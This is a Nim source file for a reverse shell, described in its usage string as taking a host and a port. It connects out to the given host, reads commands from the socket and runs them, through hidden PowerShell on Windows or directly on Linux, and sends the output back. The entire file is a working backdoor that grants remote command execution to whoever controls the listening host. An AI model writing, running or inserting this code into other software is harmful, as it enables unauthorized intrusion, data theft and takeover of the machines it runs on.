import net, osproc, docopt, strformat
from std/strutils import parseInt 

const doc = """
  Reverse reverse-shell

  Usage:
    reverse-shell <host> <port>

"""

var sock = newSocket()

proc linux() =
  let prompt = "$ "
  sock.send(prompt)
  let cmd = sock.recvline()
  if cmd == "exit":
    return
  # let result = execprocess(fmt"/bin/bash -c {cmd}")
  let result = execProcess(cmd)
  sock.send(result)
  linux()


proc window() =
  let prompt = "PS> "
  sock.send(prompt)
  let cmd = sock.recvline()
  if cmd == "exit":
    return
  let result = execprocess(fmt"powershell.exe -nop -w hidden -c {cmd}")
  sock.send(result)
  window()

proc main() =
  let args = docopt(doc, version = "1.0")

  var
    LHOST = $args["<host>"]
    LPORT = Port(parseInt($args["<port>"]))

  try:
    sock.connect(LHOST, LPORT)
    when defined windows:
      window()
    else:
      linux()
  except:
    raise
  finally:
    sock.close

when isMainModule:
  main()
